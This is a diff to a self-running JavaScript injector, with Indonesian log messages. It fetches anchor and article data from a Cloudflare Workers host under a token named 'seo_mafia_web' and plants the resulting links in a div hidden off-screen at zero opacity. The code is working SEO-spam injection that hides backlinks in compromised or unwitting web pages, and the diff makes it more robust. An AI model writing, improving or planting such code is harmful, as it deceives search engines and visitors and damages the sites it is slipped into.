@@ -1,7 +1,16 @@
 !function(){
 try{
   if(document.getElementById("bunker-payload-1")) return;
-  const DEBUG = localStorage.getItem("debug_panel1") === "1";
+  const DEBUG = (() => {
+    try {
+      return localStorage.getItem("debug_panel1") === "1";
+    } catch(e){
+      return false;
+    }
+  })();
+  const log  = (...a) => { if(DEBUG) console.log(...a); };
+  const warn = (...a) => { if(DEBUG) console.warn(...a); };
+  const error = (...a) => { if(DEBUG) console.error(...a); };
   const API_BASE = "https://smw.jsload.workers.dev";
   const TOKEN = "seo_mafia_web";
   const decode = (s) => {
@@ -29,42 +38,40 @@ try{
       return "";
     }
   }
-
   Promise.all([
     getData("b1"),
     getData("a1")
   ]).then(([anchorsRaw, articleRaw]) => {
-
     if(!anchorsRaw || !articleRaw){
       warn("Data kosong, inject dibatalkan");
       return;
     }
-
-    anchorsRaw = anchorsRaw.replace(/"/g,"").trim();
+    anchorsRaw = anchorsRaw
+      .replace(/\r/g,"")
+      .replace(/"/g,"")
+      .trim();
     articleRaw = articleRaw.trim();
-
     const anchors = anchorsRaw
       .split("\n")
       .map(x => x.trim())
       .filter(Boolean)
       .map(line => {
-
+        line = line.replace(/\s*\|\s*/g, "|");
         const parts = line.split("|").map(x=>x.trim()).filter(Boolean);
         if(parts.length < 2) return "";
-
         const anchorText = parts[0];
         return parts.slice(1).map(url=>{
+          if(!/^https?:\/\//i.test(url)) return "";
           return `<a href="${url}" target="_blank">${anchorText}</a>`;
         }).join(" ");
 
       })
       .filter(Boolean);
-
+    log("ANCHORS RESULT:", anchors);
     if(!anchors.length){
       warn("Anchor kosong");
       return;
     }
-
     let i = 0;
     let html = "";
     if(/\{ANCHOR/i.test(articleRaw)){
@@ -75,26 +82,18 @@ try{
       warn("⚠️ {ANCHOR} tidak ditemukan → fallback aktif");
       html = anchors.join(" ");
     }
-    function inject(){
-      if(document.getElementById("bunker-payload-1")) return;
-
-      const box = document.createElement("div");
-      box.id = "bunker-payload-1";
-      box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
-      box.innerHTML = html;
-      document.body.appendChild(box);
-      log("✅");
-    }
-
-    if(document.readyState !== "loading"){
-      inject();
-    }else{
-      document.addEventListener("DOMContentLoaded", inject);
-    }
-
+    inject(html);
   });
-
+  function inject(html){
+    if(document.getElementById("bunker-payload-1")) return;
+    const box = document.createElement("div");
+    box.id = "bunker-payload-1";
+    box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
+    box.innerHTML = html;
+    (document.body || document.documentElement).appendChild(box);
+    log("");
+  }
 }catch(e){
-  error("Injector fatal error:", e);
+  console.error("Injector fatal error:", e);
 }
 }();
